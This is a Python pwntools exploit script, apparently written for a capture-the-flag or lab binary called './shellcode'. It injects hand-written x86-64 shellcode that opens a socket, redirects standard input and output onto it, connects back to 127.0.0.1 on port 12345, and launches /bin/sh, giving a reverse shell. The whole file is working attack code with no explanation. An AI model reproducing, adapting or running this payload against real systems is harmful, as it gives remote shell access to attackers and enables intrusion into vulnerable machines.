#!/usr/bin/python3

from pwn import *

p = gdb.debug("./shellcode",'''
              b * main+228
              c
              ''')
#p = process("./shellcode")
#p = remote("127.0.0.1",1337)
payload = asm('''
              jmp start
              .byte 0x00
                          
              start:
                mov r14,rax
                mov rax,0x29 
                mov rdi,2
                mov rsi,1
                mov rdx,0
                syscall
                mov r14,rax 


                mov rsi,2
                mov rdi,r14
                
                dup2:
                    mov rax,0x21
                    syscall
                    dec rsi
                    jns dup2






                mov rdi,r14
                lea rsi,[rip + sock_addr]
                mov rdx,16
                mov rax,0x2a
                syscall

                
                


                movabs rbx,29400045130965551 
                push rbx
                mov rdi,rsp
                mov rax,0x3b
                xor rsi,rsi
                xor rdx,rdx
                syscall

                
                sock_addr:
                    .quad 0x100007F39300002
                    .quad 0
              
              ''',arch = 'amd64')
p.sendline(payload)

p.interactive()